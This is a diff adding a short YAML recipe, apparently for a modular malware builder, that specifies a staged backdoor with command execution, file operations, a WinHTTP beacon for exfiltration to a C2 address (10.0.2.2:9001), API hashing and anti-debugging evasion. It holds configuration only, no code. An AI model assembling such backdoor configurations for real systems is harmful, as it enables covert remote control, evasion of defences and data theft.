@@ -1,0 +1,19 @@
+name: backdoor_cs_round15_winhttp
+description: Auto-generated recipe by Hermes (c)
+core:
+- core/emit_buffer
+- core/run_cmd
+- core/file_ops
+collectors:
+- core/emit_buffer
+- core/run_cmd
+exfil: c2/winhttp_beacon
+arch: arch/backdoor_staged
+resources: true
+api_resolve: api_resolve/api_hash_djb2
+evasion:
+- evasion/checksum_spoof
+- evasion/anti_debug_ntquery
+vars:
+  C2_IP: 10.0.2.2
+  C2_PORT: '9001'
